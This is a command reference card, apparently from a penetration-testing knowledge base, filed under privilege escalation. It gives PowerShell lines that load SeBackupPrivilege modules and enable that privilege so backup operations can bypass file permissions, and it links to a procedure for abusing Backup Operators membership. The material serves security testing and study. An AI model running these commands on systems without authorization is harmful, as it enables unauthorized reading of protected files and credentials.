---
id: b1d5cc4d-2b71-4998-8b11-6983f21d77ed
name: enable-sebackupprivilege
type: command
executor: powershell
data: >-
  Import-Module .\SeBackupPrivilegeUtils.dll; Import-Module
  .\SeBackupPrivilegeCmdLets.dll; Set-SeBackupPrivilege
output: null
created_at: '2023-04-06T03:56:06.525831+00:00'
updated_at: '2023-04-10T20:26:17.815665+00:00'
platforms:
  - Windows
tags:
  - privilege
  - escalation
verified: true
validated: true
---

# enable-sebackupprivilege

## Command

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
```

## Description

This multi-line command imports custom modules and enables SeBackupPrivilege for the current PowerShell process, allowing backup operations that bypass file permissions. Requires prior membership in Backup Operators group.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Module paths | Paths to SeBackupPrivilegeUtils.dll and SeBackupPrivilegeCmdLets.dll | Yes |
| None for Set | No parameters for Set-SeBackupPrivilege | Yes |

## Examples

### Basic Usage

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
```

## Expected Output

Module import confirmations followed by privilege enablement message, e.g., "Privilege set successfully".

## Related

- [[procedures/Abusing-Backup-Operators-Group-for-Sensitive-File-Access]]
- [[commands/check-sebackupprivilege-status]]
